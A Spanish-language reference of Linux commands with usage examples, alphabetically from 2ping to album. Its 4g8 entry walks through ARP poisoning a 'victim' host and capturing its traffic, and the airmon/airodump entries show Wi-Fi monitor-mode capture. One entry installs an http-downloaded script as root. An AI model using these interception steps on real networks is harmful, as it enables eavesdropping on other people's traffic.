TRACTATUS ELEMENTALIS


2ping
Utilidad de ping bidireccional para determinar si ocurre una perdida de paquetes en un sentido o en otro.
$ 2ping -c 5 -i 2  nombre_host.com (con 5 peticiones y a intervalos de 2 segundos)
Nota.- si no se especifica número de peticiones, finalizar con ^C


4g8
Capturar paquetes de equipos de una red. Previamente preparar el equipo con los pasos previos para el envenenamiento arp lanzando en dos terminales y sin cerrarlas hasta terminar la captura:
# arpspoof -i eth0 -t 192.168.1.12 192.168.1.1
# arpspoof -i eth0 -t 192.168.1.1 192.168.1.12
El "2" el sniffado, el "1" el router y el -i … la red. El paquete que contiene arpspoof es dsniff. Activar forwarding para que los paquetes vayan a su verdadero dueño:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Para conocer los parámetros [ips y MACs] que luego tendremos que entrar en 4g8 lanzar:
# nmap 192.168.1.0/24
Para conocer los equipos de la red. Una vez escogida la victima, lanzar 4g8:
# 4g8 -i eth0 -g 192.168.1.1 -G 64:69:0C:87:A8:DC -s 192.168.1.12 -S 00:19:01:54:F5:1F -w dump.pcap
	-g (ip del router)
	-G (MAC del router)
	-s (ip de la victima)
	-S (MAC de la victima)
	-w (archivo donde guardar las capturas)
Para el análisis del archivo dump.pcap se puede usar wireshark entre otros.


7zip
[7zip-rar]. Compresor/descompresor de archivos.
$ 7z a fichero.7z fichero (Comprime)
$ 7z e comprimido (Descomprime)
$ 7z l comprimido (Muestra las propiedades)
$ 7z t fichero_comprimido (Chequea contenido)
$ 7z a -tgzip -p fichero.gz fichero (proteger con una contraseña)


9base
Es un sistema operativo distribuido similar a Unix creado por Bell Labs a mediados de los años 1980. Es una adaptación de las siguientes herramientas originales del área de usuario de Plan 9 a Unix: ascii, awk, basename, bc, cal, cat, cleanname, cmp, date, dc, dd, diff, du, echo, ed, factor, fmt, fortune, freq, getflags, grep, hoc, join, look, ls, mk, mkdir, mtime, pbd, primes, rc, read, sam, sed, seq, sha1sum, sleep, sort, split, strings, tail, tee, test, touch, tr, troff, unicode, uniq, unutf, yacc.


9menu
Crear un lanzador de aplicaciones en el escritorio.
$ 9menu -label gimp gimp & (con el título “gimp” para lanzar “gimp”)
$ 9menu 'xterm -e script.sh' & (lanzador para un script de bash)
Opciones:
	-geometry 30x20 (especificando medidas del lanzador)
	-bg yellow (color de fondo)
	-fg red (color de la fuente)
	-popup (Que se cierre el lanzador una vez clicado)


9mount
forma parte de las herramientas SUID para montar sistemas de archivos v9fs en Linux.
Ejemplo 1: Montar un sistema de archivos v9fs
# 9mount -o trans=net,port=5640 IP_servidor:ruta punto_de_montaje (montar un sistema de archivos v9fs)
# 9mount -o trans=net,port=5640,rw <servidor>:<ruta> <punto_de_montaje> (montar el sistema con acceso de lectura y escritura)
# umount <punto_de_montaje> (desmontar el sistema de archivos)
# mount | grep <punto_de_montaje> (mostrar si el punto de montaje está activo)
# 9mount -o trans=net,port=5640,ro <servidor>:<ruta> <punto_de_montaje> (montar con "ro" establece el sistema de archivos como solo lectura)


a2dismod
Desactiva modulos de apache.
# a2dismod (Lista los módulos y pregunta cual desactivar)
# a2dismod defensible (Desactiva el modulo defensible)


a2dssite
Deshabilita sitios de apache.
# a2dissite host_virtual.com


a2enmod
Activa módulos de apache.
# a2enmod defensible
# a2enmod php8.2 (activar php en localhost)


a2ensite
Habilita sitios de apache. Crear link simbólico a  la carpeta sites-enabled.
# a2ensite host_virtual.com


a2mp3
Optimizar y reducir al mínimo archivos mp3. Crea una carpeta con el archivo resultante en ~/a2mp3.
$ a2mp3 archivo.mp3


a2png
Convertir textos a imagen .png.
$ a2png texto.txt texto.png


a2ps
Imprimir y manipular archivos postscript. La codificación por defecto es la inglesa. La más parecida a utf8 es la latin1 o la iso1 [ISO-8859-1]. Incluye varios comandos: a2ps-lpr-wrapper, card, composeglyphs, fixnt, fixps, ogonkify, pdiff, psmandup, psset y texi2dvi4a2ps.
$ a2ps -o final.ps --columns=2 original.ps (Convertir un archivo [original.ps] a 2 páginas en una y mandar el resultado a otro [final.ps])
$ a2ps --printer=HP_psc_1100_series archivo.ps (mandar un archivo a imprimir)
$ a2ps -l -o archivo.ps --no-header archivo.txt (Pasar un txt a ps y sin poner encabezados y apaisado[-l])
$ a2ps -X latin1 -o archivo.ps archivo.txt (Especificando codificación)
$ a2ps --list=encoding (Listado de codificaciones suportadas)
$ a2ps file.txt imagen.png impreso.pdf imagen.gif -o- | ps2pdf -  archivo.pdf (unir varios archivos en un ps y luego convertirlo a pdf)
Nota.- La opción -o- dice a a2ps que escriba el resultado en STDOUT. La opción - dice a ps2pdf que lea desde STDIN. Para visualizar ps puede usarse la aplicación gv.


a2x
Convierte texto plano a formato PDF [por defecto], EPUB, DVI, PS, LaTeX, XHTML, página man...
$ a2x -f epub archivo.epub (Convertir a epub. )
$ a2x -f manpage archivo.txt (Convertir a página man)


aa3d
Generador de arte ASCII a partir de textos o imagenes.
$ aa3d < texto.txt
$ aa3d -w 100 -t "linux es un sistema genial" (Con anchura de 100 espacios [por defecto 80] y usando un determinado texto)
$ aa3d -d < texto.txt (Usando solo números)


aafire
[caca-utils]. Fuego animado en ascii. En algunas distros cacafire [ver].
$ aafire


aajm
Malabarista en la terminal.
$ aajm -drive curses (para lanzarlo en las tty)
$ aajm -t Reverse (especificar el estilo. Las opciones de estilo son: Normal, Reverse, Shower, Mills Mess, Center, Windmill y Random)
Opciones durante la actuación:
	s (modificar el número de bolas)
	- + (disminuir o acelerar al artista)
	h (muestra las opciones)
	q (salir)


aaphoto
Ajuste del color automático para fotos.
$ aaphoto -a --overwrite * (autoajuste y sobreescribiendo todas las fotos del directorio)
$ aaphoto -r 200 --jpg imagen.png (ajustarla a 200 pixels i con salida a jpg)
$ aaphoto -r 50% --rotate90 imagen.png (Ajustandola al 50% y girandola 90ª)
$ aaphoto --flipy imagen.png (espejo vertical)
$ aaphoto --flipx --rotate180 imagen.png (espejo horizontal y rotandola 180º)


ab
[apache2-utils]. Mostrar la capacidad de respuesta de un servidor WEB.
$ ab -n 100 -c 10 localhost:80/index.html (Con 100 conexiones y 10 simultaneas)
$ ab -n 9000 -c 900 -e test.txt http://www.google.com/ (Escribe en un archivo el tiempo [milisegundos] que tomó para servir a ese porcentaje de las solicitudes)


abcde
[lame, cdparanoia, id3v2, vorbis-tools, cd-discid, normalize]. Extraer pistas de audio de un cd.
$ abcde -d /dev/sdc1 -N -x -o mp3 (extrae disco completo en archivos mp3)
$ abcde -d /dev/sdc1 -N -x -o ogg (extrae disco completo en archivos ogg)
$ abcde -d /dev/sdc1 -N -x -o ogg tracks 1-3 5 (extrae las tres primeras canciones y la quinta)
	Nota.- "-d" indica dispositivo, "-N" opciones por defecto y sin preguntar, "-x" expulsa el cd al acabar, "-o" tipo de archivo resultante


abiword
Procesador de texto completo y rápido y con una interfaz muy simple. Dado que requiere pocos recursos técnicos puede usarse en equipos obsoletos. Tiene filtros de importación/exportación de documentos desde su formato nativo a XML, RTF, HTML, Microsoft Word, LaTeX y OpenDocument.
$ abiword --to=doc nombre.pdf (pasar pdf a doc)
$ abiword --geometry=1366x768 (Iniciar maximizado según la resolución de pantalla)


abook
Muestra una plantilla de libreta de direcciones. Proporciona muchos campos diferentes de información del usuario como nombre, email, dirección y varios campos de teléfono. abook está diseñado para usar con mutt, pero se puede usar de forma independiente.
$ abook (forma básica)
$ abook -C archivo (Usando una plantilla diferente. Por defecto  en ~/.abook/abookrc)
Algunas teclas de control:
	a (Añadir contacto y crear las pestañas para los datos. Usar las flechas para moverse entre pestañas y los números de los conceptos para entrar información)
	r (Suprimir contacto)
	q (Salir)


abootimg
Utilidad para manipular archivos de imagen de partición que se utilizan en dispositivos Android para arrancar sistemas operativos.
# abootimg --create my_boot.img --kernel .bin --ramdisk ramdisk.cpio.gz (crear imágen de partición desde cero)
# abootimg --extract my_boot.img (extraer componentes de una imagen existente)
# abootimg --info my_boot.img (verificar la estructura de una imagen)
# abootimg --modify my_boot.img --set-kernel new_kernel.bin (modificar componentes de una imagen existente)
# abootimg --compress my_boot.img (comprimir imagenes)
# abootimg --decompress ed_boot.img (descomprimir)


abr2gbr
Herramienta para convertir archivos de pincel ABR de Adobe PhotoShop y Corel Paint Shop Pro JBR al formato GBR de GIMP.
$ gimp --batch-process --process=abr2gbr entrada.abr salida.gbr
$ gimp --batch-process --process=abr2gbr --brushes-only --flatten output_file.gbr input_file.abr


abs-guide
Un montón de ejemplos de bash scripting. Listado en:
$ ls /usr/share/doc/abs-guide/examples/


abw2epub
Convierte documentos AbiWord a ePub.
$ abw2epub entrada.abw salida.epub


abw2odt
Convertir documentos AbiWord en documentos OpenDocument de libreofficce.
$ abw2odt entrada.abw salida.odt


ac
[acct]. Reporta los tiempos de conexión...
$ ac -p (totales de cada usuario)
$ ac -f ~/Documents/text.txt (horas de uso del archivo especificado)
# ac -d -y (conexión por dias y total año del usuario root)
# ac --reboots (desde el reinicio)


accountservice
Se usa para gestionar información de cuentas de usuario en sistemas Linux a través de interfaces D-Bus.
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts org.freedesktop.Accounts.ListCachedUsers (muestra las cuentas de usuario que están en caché en el sistema)
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts/User$UID org.freedesktop.DBus.Properties.Get string:"org.freedesktop.Accounts.User" string:"UserName" (información sobre un usuario específico del que debes saber nombre y UID)
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts/User$UID org.freedesktop.Accounts.User.SetIconFile string:"/imagen.jpg" (establecer nueva imagen de perfil para un usuario)
$ dbus-send --system --print-reply --dest=org.freedesktop.Accounts /org/freedesktop/Accounts/User$UID org.freedesktop.Accounts.User.SetRealName string:"Nuevo_Nombre" (cambiar el nombre de usuario)


acct
Conjunto de utilidades (ac, lastcom, accton, dump-acct, dump-atmp y sa) que se ejecutan en segundo plano y realizan un seguimiento de la actividad de cada usuario en el sistema, tiempos de conexión (en horas) así como de los recursos que se están consumiendo. Normalmente se levanta el servicio durante la instalación pero si no se ha levantado:
# /etc/init.d/acct start
Luego podran lanzarse las aplicaciones del paquete y los logs se guardarán en el archivo /var/log/account/pacct.
# ac (muestra el total de horas)
# ac -d (por dias)
# ac -p (de cada usuario)
# dump-acct /var/log/account/pacct (ver el contenido de logs)
# dump-utmp /var/log/account/pacct
# lastcomm root (del usuario root)
# sa -a (comandos que fueron ejecutados por los usuarios)


accton
[acct]. Activar o desactivar la contabilidad de los procesos para la aplicación acct [ver].
# accton on (activar registros)
# accton off (parar registros)


acheck
Útil para revisar y corregir errores de localización en archivos de distintos formatos.
$ acheck archivo.po (mostrará los errores o advertencias comunes que encuentre, como incoherencias de traducción o problemas de formato)
$ acheck /dir (revisar un directorio completo y generar un informe de errores encontrados en cada uno)
$ acheck --mode=strict archivo.po (ejecutar el análisis en un modo más exhaustivo)
$ acheck archivo.po > errores.txt (errores.txt contiene las advertencias y errores detallados encontrados en el archivo)


achilles
Simulación pelín subrealista de vida artificial y evolución.
$ achilles -x 4 -z 4 -f 5 (número de bloques en el eje y y en el x y número de alimentos iniciales)


ack
Está diseñado como una alternativa de grep. ack es inteligente en cuanto a los archivos que busca. Conoce ciertos tipos de archivos, según la extensión del archivo y, en algunos casos, el contenido del archivo. Para paginar la salida:
     $ echo '--pager=less -RFX' >> ~/.ackrc
$ ack palabra (averiguar todas las instancias en las que se encuentra el patrón)
$ ack -w palabra (palabra textual)
$ ack -c palabra (que indique solo el número de lines coincidentes)
$ ack -ch palabra (-h suprime el prefijo del nombre de archivo en la salida y elimina los archivos con cero resultados. Mostrara número de líneas donde se realizó la búsqueda)
$ ack -f palabra (imprimir solo los archivos que tienen coincidencias del directorio)
$ ack -g log --cc (todos los archivos de lenguaje C que tienen el patrón "log" en algún lugar de su ruta)
$ ack -f --cc (muestrar todos los archivos en lenguaje C)


aclock
Reloj digital en la pantalla.
$ AClock


acmetool
Herramienta para adquirir automáticamente certificados TLS de servidores ACME [Automated Certificate Management Environment].
$ acmetool init --email correo@dominio.com --domain dominio.com (configuración inicial)
$ acmetool get --domain dominio.com (obtener un certificado nuevo)
$ acmetool renew --domain dominio.com (renovar un certificado existente)
$ acmetool list --domain dominio.com (verificar los certificados obtenidos)
Nota.- Es necesario tener configurado un proveedor de nombres de dominio y un servidor web para que acmetool pueda realizar los cambios necesarios en el registro DNS y en el archivo .well-known/acme-challenge/ del sitio web.


aconnect
Utilidad para conectar y desconectar dos puertos midi existentes en el sistema al secuenciador ALSA.
$ aconnect 64:0 65:0 (conectar el puerto 64 al 65)
$ aconnect -d 64:0 65:0 (desconectar)
$ aconnect -l (lista de conexiones)
$ aconnect -x (suprimir todas las conexiones exportadas)


acpi
Monitorizar estado de la bateria del portatil, si está conectado a la red y otras informaciones.
$ acpi -c (ventiladores)
$ acpi -t (temperaturas)
$ acpi -b (bateria)
$ acpi -i (información adicional de la bateria)
$ acpi -V (ver toda la información posible)
$ watch acpi -V (en tiempo real)
$ cat /proc/acpi/battery/BAT0/info (Muestra varios datos, los más importantes: design capacity y last full capacity. La diferencia entra ambas cantidades es la capacidad que ha perdido la bateria)


acpi_fakekey
Se usa para enviar eventos de teclas específicas al sistema, lo cual puede ser útil para simular pulsaciones de teclas en casos donde un script o aplicación necesite activar ciertas funciones. Este comando suele estar presente en sistemas Linux con soporte ACPI y requiere privilegios de superusuario para ejecutarse.
# acpi_fakekey 114 (simular la tecla de bajar volumen)
# acpi_fakekey 224 (simular la tecla de reducir el brillo)
# acpi_fakekey 99 (simula la tecla ImprPant)
Nota.- Para ver los códigos de las teclas puede hacerse con la aplicación showkey [ver]


acpid
Demonio que gestiona eventos de ACPI [Advanced Configuration and Power Interface] relacionados con la energía y el hardware del sistema, como estado de la batería, conexiones de corriente, botón de encendido y cierre de la tapa en portátiles.
# systemctl status acpid (comprobar si está activo)
# systemctl start acpid (si no lo está acivarlo)
# acpi_listen (ver qué eventos están disponibles y cómo se reconocen)
# journalctl -u acpid (consultar los registros del sistema donde se registran los eventos de ACPI)
# acpid reload (recargar acpid sin necesidad de reiniciar el servicio)


acpitail
Muestra información del estado de ACPI sobre la batería, el ventilador y la temperatura.
$ acpitail -B 60 -F 10 (de la bateria cada 60 segundos. Por defecto 15 y del ventidador cada 10. Por defecto 5)


acpitool
Información en laptops sobre el estado de la batería, la temperatura y la capacidad de suspender.
$ acpitool -c (información general)
$ acpitool -b (información detallada del estado de la bateria)
$ acpitool -t (verificar estado térmico)
$ acpitool -T (información detallada sobre el sistema térmico)
$ acpitool -s (verificar si el sistema está suspendido)
$ acpitool -S (información detallada sobre el estado de suspensión)
$ acpitool -l (lista completa de componentes disponible en el sistema)


adb
[Android Debug Bridge]. Herramienta que permite comunicar con instancias de emuladores o dispositivos Android conectados para ejecutar comandos, transferir archivos, depurar aplicaciones, etc.
$ adb devices (mostrar una lista de los dispositivos conectados y sus estados, como "device" [conectado y listo para usar] o "offline" [no responde])
$ adb install aplicacion.apk (instalar una aplicación. Envía la aplicación desde el ordenador al dispositivo)
$ adb pull /ruta/del/archivo/en/dispositivo /ruta/de/destino/en/ordenador (copiar un archivo desde el dispositivo al ordenador)
$ adb push /ruta/del/archivo/en/ordenador /ruta/de/destino/en/dispositivo (copiar un archivo desde el ordenador al dispositivo)
$ adb shell (acceder a una sesión de shell en el dispositivo)
$ adb reboot (reiniciar el dispositivo)
$ adb reboot recovery (reiniciar en modo recuperación)
$ adb reboot bootloader (reiciciar en el cargador de arranque)
$ adb exec-out screencap -p > captura.png (capturar la pantalla del dispositivo y guardarla en el ordenador y guardarla en el directorio actual)
$ adb shell screenrecord video.mp4 (grabar la pantalla del dispositivo y guardarla en el dispositivo mismo. Despues se puede transferir al pc con "adb pull")
$ adb uninstall paquete (desinstalar una aplicación usando su nombre de paquete)
$ adb logcat (ver los logs del sistema en tiempo real)
$ adb kill-server (si adb no detecta los dispositivos conectados, probar a reiniciar el servidor)
$ adb start-server


add-apt-repository
Simplifica la adición de repositorios concretos al sistema de aplicaciones que no se encuantran todavia en los repos oficiales. Instalar esta aplicación de Ubuntu en Debian mediante un script:
$ wget http://blog.anantshri.info/content/uploads/2010/09/add-apt-repository.sh.txt (descarga)
# cp add-apt-repository.sh.txt /usr/sbin/add-apt-repository (copiar al directorio /usr/sbin)
# chmod o+x /usr/sbin/add-apt-repository (otorgar permisos de ejecución)
# chown root:root /usr/sbin/add-apt-repository (otorgar la propiedad a root)
# add-apt-repository ppa:ppa-name (instalar una aplicación)
1.-
Otra forma de añadir repositorios a /etc/apt/sources.list o a /etc/apt/sources.list.d/ en el ejemplo añade el repositorio del escritorio Mate según la versión de Ubuntu instalada
	# add-apt-repository deb http://packages.mate-desktop.org/repo/ubuntu $(lsb_release -cs) main


addgnupghome
Si GnuPG se instala en un sistema con cuentas de usuario existentes, es necesario rellenar el directorio de inicio de GnuPG estos archivos existentes.  Especialmente 'trustlist.txt' y un keybox con algunos certificados iniciales. Este script ayuda a hacer esto copiando todos los archivos de /etc/skel/.gnupg a los directorios personales de las cuentas indicadas en la línea de comandos. Tiene cuidado de no sobrescribir los directorios de inicio de GnuPG existentes.
# addgnupghome cuenta_user1 cuenta_user2


addresses-googies-for-ngustep
Herramientas diseñadas para integrar contactos en entornos basados en GNUstep. Incluye las herramientas; adgnumailconverter, adserver, y adtool.
$ adgnumailconverter -i archivo_correo.mbox -o archivo_contactos.abook (convertir contactos desde archivos de correos GNU Mail en un formato compatible con AddressBook de GNUstep)
$ adserver --port 1234 (permitir que otros usuarios o aplicaciones se conecten al servidor de direcciones a través del puerto especificado. Por defecto 1234)
$ adtool --add --name "Juan Pérez" --email juan.perez@example.com (agregar un contacto)
$ adtool --list (listar contactos)
$ adtool --search "Juan Pérez" (buscar un contacto)


add-shell
[debianutils]. Agrega shells a la lista de shells de inicio de sesión válidos. copia /etc/shells a /etc/shells.tmp y agrega los shells dados a este archivo si aún no están presentes y copia este archivo temporal de nuevo a /etc/shells. Deben proporcionarse rutas de acceso completas de las shells.
$ add-shell /bin/rbash


adduser
Crear nuevo usuarios [ver useradd].
# adduser USER (crear el usuario USER y por defecto su home en /home/USER)
# adduser --home /home/users/USER --shell /bin/zsh USER (crea el usuario USER con su home en /home/users/USER y su shell zsh)
Otras caracteristicas que podemos especificar:
--disabled-password USER (sin contraseña para USER)
--disabled-login USER (sin permisos para iniciar sesión)


adduser.conf
Archivo que contiene las preferencias para los comandos adduser y addgroup [/etc/adduser.conf]. Algunos parámetros importantes:
	DSHELL=/bin/bash (shell para nuevos usuarios. Por defecto /bin/bash)
	DHOME=/home (donde se crean los directorios de los nuevos usuarios. Por defecto /home.
	SKEL=/etc/skel (directorio de donde se copian los ficheros de configuración base del usuario. Por defecto /etc/skel)
	FIRST_UID=1000 (Valor inicial del rango de IDs para usuarios normales)
	LAST_UID=29999 (Rando final del rango de IDs)
	DIR_MODE=0755 (Permisos de entrada de todos los directorios creados)


adequate
comprobaciones adecuadas de los paquetes instalados en el sistema e informes de errores y violaciones de políticas.
$ adequate --all (comprobacion de todos los paquetes instalados)
$ adequate coreutils (comprobar un paquete)
$ adequate --tags obsolete-conffile --all (comprobar paquetes obsoletos)


adjtimex
Utilidad para manipular las variables de tiempo del núcleo. Para una máquina conectada a Internet la mejor manera de mantener la precisión del reloj del sistema es utilizando NTP [Network Time Protocol]. Es importante tener en cuenta que el uso de este comando puede afectar negativamente el rendimiento del sistema si se utiliza excesiva o incorrectamente. Se recomienda su uso con precaución y solo cuando sea absolutamente necesario.
$ adjtimex /dev/rtc0 --set-system-time=2024-10-24 20:00:00 (establece la hora del sistema al 24 de octubre de 2024 a las 20:00:00.)


adminer
Gestor de bases de datos via navegador más completa que phpmyadmin. Una vez instalado reiniciar apache:
# /etc/init.d/apache2 restart
Acceder a la aplicación con, http://localhost/adminer y entrar los datos de acceso (usuario, contraseña, servidor y gestor de la BD).


adns-tools
Hacer consultas DNS. Incluye las aplicaciones adnsheloex, adnshost, adnslogres y adnsresfilter
$ echo "ejemplo.com" | adnsresfilter (consulta básica)
$ echo "ejemplo.com" | adnsresfilter -t 5000 (ajustando tiempo de espera a 5 segundos para resolver ejemplo.com)
$ adnsresfilter -t 3000 < lista_de_dominios.txt (con una lista de dominios, a uno por linea y una espera de 3 segundos por consulta)
$ adnsresfilter < lista_de_dominios.txt > resultados_dns.txt (redirigiendo la lista de entrada a un archivo de resultados)
$ adnsheloex mail.ejemplo.com cliente.ejemplo.com 192.168.1.1 (envía un saludo HELO desde cliente.ejemplo.com al servidor mail.ejemplo.com usando la dirección IP 192.168.1.1. Útil para verificar correo electrónico o autenticaciones)
$ adnshost ejemplo.com (mostrar las direcciones IP asociadas al dominio ejemplo.com)
$ cat archivo.log | adnslogres (leer el archivo de registro [logs] y resolver direcciones IP en nombres de dominio)
$ adnshost -t a google.com (devolver la dirección IP v4 asuciada al dominio google.com)
$ adnshost -t aaaa google.com (muestra la dirección IPv6 del dominio especificado)
$ adnshost -t ns google.com (mostrar la lista de servidores DNS que gestionan el dominio)
$ adnshost -t txt google.com (obtiener el registro TXT)
$ adnshost -t soa google.com (información sobre el servidor principal, el contacto administrativo y otros detalles técnicos del dominio)


advancecomp
Contiene utilidades de recompresión para archivos .zip, imágenes .png, videoclips .mng y archivos .gz. Para la recompresión, se utiliza 7-Zip sin pérdida de calidad.
$ advzip -z archivo.zip (recomprime un .zip y reduce su tamaño optimizando la compresión)
$ advzip -z -4 archivo.zip (nivel máximo de compresión [de 0 a 4])
$ advzip -z -4 *.zip (optimizar todos los archivos .zip en un directorio)
$ advpng -z archivo.png (optimiza un .png reduciendo su tamaño sin perder calidad)
$ advpng -z -4 archivo.png (estleciendo nivel máximo de compresión del .png)
$ advmng -z archivo.mng (recomprimir archivo .mng)
$ advmng -z -4 archivo.mng (recomprimir con el máximo nivel de compresión)
$ advgz -z archivo.gz (recomprime un  .gz usando una mejor técnica de compresión)
$ advgz -z -4 archivo.gz (y aplicando el máximo nivel de compresión)


aewan
Editor de dibujos en ascii. Una vez lanzada la aplicacion con las teclas de funcion F1-F4, se accede a los menus. La aplicacion llama ^ a la tecla control y % a la tecla Alt.
Algunas teclas de control:
	Ctrl a (Abre un lienzo con las medidas por defecto)
	Alt a (Pregunta por las medidas del lienzo)
	Ctrl o (Abre un dibujo guardado previamente)
	Ctrl s (Guarda el presente dibujo)
	Ctrl w (Si tenemos mas de un dibujo, pasa al siguiente)
	Ctrl q (Pasa al anterior)
	Ctrl l (Muestra los lienzos abiertos y algunas opciones sobre ellos)
	Ctrl d (Copiar el lienzo)
	Ctrl r (Renombrar el lienzo)
	Alt r (Modificar las medidas)
	TAB (Abre el dialogo de colores)
	Alt p (Seleciona el color de la celda donde esta el cursor)
	Alt z (Llena la celda del color que se ha seleccionado con Alt p))
	Ctrl e (Muestra los metadatos)
	Ctrl c (Sale del programa)


afio
Útil para crear y gestionar archivos en formato de compresión propio.
$ find /directorio | afio -o -Z -F -z9 -O archivo.afio (crear un archivo comprimido de un directorio)
$ afio -i -Z -F -z9 -O archivo.afio -D /directorio_destino (descomprimir)
$ find /nuevos_archivos | afio -o -a -O archivo.afio (agregar archivos a un archivo afio ya existente)
$ afio -t -Z archivo.afio (ver contenido sis extraerlo)
$ find /dir_respaldo | afio -o -Z -O archivo.afio && scp archivo.afio usuario@servidor:/destino/ (realiza un respaldo y luego transfiere el archivo al servidor de destino)
$ find /ruta -name "*.txt" | afio -o -Z -O textfiles.afio (comprimir solo archivos de un tipo específico como .tx)
$ afio -i -Z -O archivo.afio "*.txt" (extraer solo archivos específicos como los .txt)
Las opciones expuestas:
    -o: indica que se va a crear un archivo.
    -Z: usa compresión gzip.
    -F: guarda rutas absolutas.
    -z9: usa la máxima compresión.
    -O archivo.afio: especifica el nombre del archivo de salida.
    -i: indica que afio va a leer el archivo y extraer los contenidos.
    -D /directorio_destino: especifica el directorio de destino para los archivos extraídos.
    -a: indica que los archivos se van a añadir al archivo ya existente.
    -t: lista los archivos dentro del archivo .afio sin extraerlos.


age
Cifrar y descifrar archivo. Si no se especifica archivo de salida lo hace por pantalla.
$ age -e -p -o salida archivo_entrada (encriptar con contraseña con el nombre de salida especificado el archivo_entrada)
$ age -o desencriptado -d encriptado (desencriptar un archivo encriptado)
$ age-keygen | age -p > clave.age (crear un clave y guardarla en clave.age)


agedu
Escanea directorios e informa de la cantidad de datos.
$ agedu -s .
$ agedu -s /var/www/html
$ agedu -s /var/www/html -w (abrir el informe en el navegador)


agetty
Alternativa a getty. Abre un puerto tty, pide un nombre de usuario e invoca el comando /bin/login. Es un programa que se ejecuta en una computadora host que administra terminales físicos o virtuales para permitir el acceso de múltiples usuarios. Tiene algunas características no-estandar que son útiles para líneas de cable y líneas telefónicas.
$ agetty 9600 ttyS1
$ agetty -8 – linux (opciones para tty de 8 bits, '-' la entrada estándar ya está conectada a una tty y 'linux' es el valor de la variable de entorno TERM)
$ agetty -8 -t 5 linux (tiempo de espera del proceso de inicio de sesión 5 segundos)
$ agetty --local-line 9600 ttyS1 vt100
$ agetty --extract-baud --timeout 60 ttyS1 9600,2400,1200 (Para una línea de marcación de estilo antiguo con un módem de 9600/2400/1200 baudios)
$ agetty --wait-cr --init-string 'ATE0Q1&D2&C1S0=1\015' 115200 ttyS1 (Para un módem Hayes con una interfaz fija de 115200 bps a la máquina. La cadena de inicio de ejemplo desactiva el eco del módem y los códigos de resultado, hace que el módem/computadora rastree el módem/módem DCD, hace que una caída de DTR cause una desconexión y activa la respuesta automática después de 1 pitido)


aha
Lee el texto de entrada, lo convierte a HTML en color y lo escribe en la salida.
$ echo q | htop | aha -b -l > htop.html (Cree un archivo HTML con un fondo negro a partir de la salida de htop. La opción -l anula otros comandos de nueva línea que usa htop)
$ man age | aha -b -t 'manual de age' -y 'font-size:1.875em' > aha-age.html (con fondo negro, especificando título y una fuente concreta)
$ ls -al --color=force | aha --pink > ls.htm (ls coloreado y pasado a html)


aide
Sistema de detección de intrusos. No evita la intrusión, sólo informa que esta se ha producido y qué archivos fueron modificados. La primera vez que se ejecuta, crea una base de datos con los atributos, usuarios, permisos... de los archivos especificados aplicándoles una o varias funciones hash por lo que el mejor momento para instalar esta aplicación es con un sistema recien instalado.
# aide -i (Crear la base de datos. Al iniciar por  primera vez y evitar: Couldn't open file /var/lib/aide/please-dont-call-aide-without-parameters/aide.db.new for writing)
# aide -u (Actualizar la base de datos)
# aide -c (Hacer un chequeo del sistema para comprobar modificaciones)
	Nota.- Los archivos de configuración: /etc/aide/aide.conf.d/, /etc/aide/aide.conf y /etc/default/aide


airmon
[aircrack-ng]. Utilidad que coloca la tarjeta de red en modo monitor.
# airmon-ng start wlan0 (Iniciar el modo monitor)
# airmon-ng stop wlan0 (Finalizarlo)
# airmon-ng start wlan0 5 (Eespecificando un canal)
	Nota.- Confirmar que la tarjeta está en modo monitor con iwconfig.


airodump
[aircrack-ng]. Escaneo wifi y captura de paquetes. Previamente la tarjeta tiene que estar en modo monitor [ver airmon].
# airodump-ng mon0 (Escanear redes disponibles. Para con Ctrl + c)
# airodump-ng -c 8 --bssid BSSID –w captura.cap mon0 (que guarde las capturas del canal 8 de la dirección MAC [BSSID] en el archivo "captura.cap" de la interfaz de red mon0)


ajaxplorer
Crear un owncloud [tipo dropbox] en local. Una vez instalado:
# cp /usr/share/doc/ajaxplorer/apache2.sample.conf /etc/apache2/sites-enabled/ajaxplorer.conf
Reiniciar apache:
# service apache2 restart
Aceder con http://localhost/ajaxplorer y, como primer paso, modificar la contraseña por defecto [admin/admin]


ajaxterm
Proporciona una shell web por un puerto dado aceptando peticiones del mismo equipo desde el navegador.
$ ajaxterm -d (Lanza como demonio, colocando el puerto 8022 [si no se ha modificado] a la escucha)
Se accede en local colocando en la barra del navegador: http://localhost:8022
$ ajaxterm -p 12500 (Modificando el puerto por defecto)
1.-
Modificar las medidas de la terminal:
# nano /usr/share/ajaxterm/ajaxterm.py
Modificar la linea con las medidas escogidas:
	def __init__(self,width=150,height=60):
# nano /usr/share/ajaxterm/ajaxterm.html
	t=ajaxterm.Terminal("term",150,60);


akregator
Lector RSS.
Teclas de control:
	Ctrl + r (Marcar fuente como leida)
	Ctrl + q (Salir de la aplicación)
	Ctrl + l (Obtener todas las fuentes)
	Ctrl + w (Cerrar pestaña)
	- (Articulo previo sin leer)
	+ (Articulo siguiente sin leer)
	F2 (Editar la fuente)
	F5 (Obtener la fuente)
	p (Fuente anterior)
	n (Fuente posterior)
	Ctrl + Mayus + r (Marcar todas las fuentes como leidas)
	Ctrl + Mayus + return (Abrir noticia en el navegador externo)
	Mayus + return (Abrir noticia en una pestaña)


alacritty
Emulador de terminal que utiliza GPU para realizar su trabajo. Un archivo de configuración puede ser <https://gitlab.com/dwt1/dotfiles/-/raw/master/.config/alacritty/alacritty.yml> y puede copiarse en ~/.alacritty. Puede descargarse de <https://github.com/alacritty/alacritty/releases>


alarm-clock-applet
Reloj despertador que se situa en el área de notificación. Admite alarmas múltiples y repetibles, así como función de repetición y un sistema de notificación flexible. Se admiten dos tipos de alarmas: despertadores y temporizadores. La notificación se realiza reproduciendo un sonido o lanzando una aplicación
$ alarm-clock-applet (coloca el applet en el area de notificación)


album
Crear una galeria de imagenes. En la carpeta de las imagenes:
$ album
Carpeta de temas en /usr/share/album/Themes/ pero es preferible copiarla en el directorio raiz del directorio web:
$ cp -R /usr/share/album/Themes /var/www/.Themes
$ album -theme Stars fotos/ (Usando el tema especificado con el directorio “fotos”. Listado en /usr/share/album/Themes/)
$ album -columns 3 fotos/ (que la página principal tenga un terminado número de columnas con las imágenes)
$ album -charset=UTF-8 fotos/ (Especificar codificación de caracteres)
Para agregar pies de foto , crear el archivo captions.txt en el directorio y con el siguiente esquema:
